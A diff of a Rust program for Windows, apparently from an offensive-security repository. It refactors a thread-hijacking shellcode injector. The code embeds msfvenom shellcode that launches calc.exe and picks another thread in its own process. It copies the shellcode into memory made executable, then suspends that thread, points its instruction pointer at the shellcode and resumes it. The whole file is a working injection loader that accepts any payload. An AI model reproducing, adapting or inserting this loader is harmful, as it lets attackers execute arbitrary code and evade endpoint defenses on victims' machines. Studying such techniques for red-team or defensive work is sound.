@@ -1,24 +1,19 @@
-use {
-    std::{
-        mem::size_of,
-        ptr::{copy_nonoverlapping, null},
-    },
-    windows::Win32::{
-        System::{
-            Diagnostics::{
-                Debug::{GetThreadContext, SetThreadContext, CONTEXT},
-                ToolHelp::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32},
+use std::ptr::copy_nonoverlapping;
+use windows::core::{Error, Result};
+use windows::Win32::Foundation::E_FAIL;
+use windows::Win32::{
+    Foundation::HANDLE, 
+    System::{
+        Memory::*,
+        Threading::*,
+        Diagnostics::{
+            ToolHelp::*,
+            Debug::{
+                GetThreadContext, SetThreadContext, 
+                CONTEXT, CONTEXT_ALL_AMD64
             },
-            Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-                PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-            },
-            Threading::{
-                GetCurrentProcessId, GetCurrentThreadId, OpenThread, ResumeThread, SuspendThread,
-                WaitForSingleObject, INFINITE, THREAD_ALL_ACCESS,
-            }
-        }, 
-        Foundation::HANDLE, System::Diagnostics::Debug::CONTEXT_ALL_AMD64,
-    },
+        },
+    }, 
 };
 
 // https://github.com/microsoft/win32metadata/issues/1044
@@ -28,31 +23,7 @@ struct AlignedContext {
     ctx: CONTEXT
 }
 
-unsafe fn find_thread() -> Result<HANDLE, String> {
-    let process_pid = GetCurrentProcessId();
-    let thread_pid = GetCurrentThreadId();
-    let hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0).expect("CreateToolhelp32Snapshot Failed With Error");
-    let mut thr = THREADENTRY32 {
-        dwSize: size_of::<THREADENTRY32>() as u32,
-        ..Default::default()
-    };
-
-    if Thread32First(hsnap, &mut thr).is_ok() {
-        loop {
-            if thr.th32OwnerProcessID == process_pid && thr.th32ThreadID != thread_pid {
-                let h_thread = OpenThread(THREAD_ALL_ACCESS, false, thr.th32ThreadID).expect("Failed to open thread");
-                return Ok(h_thread);
-            }
-
-            if Thread32Next(hsnap, &mut thr).is_err() {
-                break;
-            }
-        }
-    }
-    Err("Thread not found".to_string())
-}
-
-fn main() -> Result<(), String> {
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -75,40 +46,36 @@ fn main() -> Result<(), String> {
         0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
+
     unsafe {
         // If you want to create a thread and then steal it, you can create it like this
+        //
         // let hthread = CreateThread(
-        //     Some(null()),
+        //     None,
         //     0,
         //     Some(function),
-        //     Some(null()),
+        //     None,
         //     THREAD_CREATION_FLAGS(CREATE_SUSPENDED.0),
-        //     Some(null_mut())
-        // ).unwrap_or_else(|e| {
-        //     eprintln!("[!] CreateThread Failed With Error: {e}");
-        //     exit(-1);
-        // });
+        //     None
+        // )?;
 
+        // Locate a thread in the current process (excluding self)
         println!("[+] Searching for the thread handle ");
         let hthread = find_thread()?;
 
-        let address = VirtualAlloc(
-            Some(null()),
-            shellcode.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        );
+        // Allocate RW memory in the current process for shellcode
+        let address = VirtualAlloc(None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if address.is_null() {
+            return Err(Error::new(E_FAIL, "VirtualAlloc Failed".into()));
+        }
 
+        // Copy the shellcode into the allocated memory
         println!("[+] Copying the shellcode");
-        copy_nonoverlapping(shellcode.as_ptr() as _, address, shellcode.len());
+        copy_nonoverlapping(shellcode.as_ptr().cast(), address, shellcode.len());
 
+        // Make the allocated memory executable
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(
-            address,
-            shellcode.len(),
-            PAGE_EXECUTE_READWRITE,
-            &mut oldprotect,
-        ).map_err(|e| format!("VirtualProtect Failed With Error: {e}"))?;
+        VirtualProtect(address, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect)?;
 
         let mut ctx_thread = AlignedContext {
             ctx: CONTEXT {
@@ -117,28 +84,63 @@ fn main() -> Result<(), String> {
             },
         };
 
+        // Suspend the thread to safely alter execution flow
         SuspendThread(hthread);
 
+        // Retrieve the current thread context
         println!("[+] Retrieving thread context");
-        GetThreadContext(hthread, &mut ctx_thread.ctx).map_err(|e| format!("GetThreadContext Failed With Error: {e}"))?;
+        GetThreadContext(hthread, &mut ctx_thread.ctx)?;
 
         ctx_thread.ctx.Rip = address as u64;
 
+        // Apply the modified thread context with new RIP
         println!("[+] Setting the thread context");
-        SetThreadContext(hthread,  &ctx_thread.ctx).map_err(|e| format!("SetThreadContext Failed With Error: {e}"))?;
+        SetThreadContext(hthread,  &ctx_thread.ctx)?;
 
+        // Resume the hijacked thread and trigger execution
         println!("[+] Thread Executed!");
-
         ResumeThread(hthread);
-
         WaitForSingleObject(hthread, INFINITE);
     }
 
     Ok(())
 }
 
+/// Finds and opens a thread belonging to the specified process ID (PID).
+///
+/// # Returns
+///
+/// * `Ok(HANDLE)` - A handle to the found thread.
+/// * `Err` - If no thread for the given PID is found or cannot be opened.
+fn find_thread() -> Result<HANDLE> {
+    unsafe {
+        let pid = GetCurrentProcessId();
+        let tid = GetCurrentThreadId();
+        let hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)?;
+        let mut thr = THREADENTRY32 {
+            dwSize: size_of::<THREADENTRY32>() as u32,
+            ..Default::default()
+        };
+    
+        if Thread32First(hsnap, &mut thr).is_ok() {
+            loop {
+                if thr.th32OwnerProcessID == pid && thr.th32ThreadID != tid {
+                    let h_thread = OpenThread(THREAD_ALL_ACCESS, false, thr.th32ThreadID)?;
+                    return Ok(h_thread);
+                }
+    
+                if Thread32Next(hsnap, &mut thr).is_err() {
+                    break;
+                }
+            }
+        }
+    }
+
+    Err(Error::new(E_FAIL, "Thread not found".into()))
+}
+
 // Example of a function to create a thread
-// unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
+// unsafe extern "system" fn function(_param: *mut std::ffi::c_void) -> u32 {
 //     let a = 1 + 1;
 //     return a;
 // }
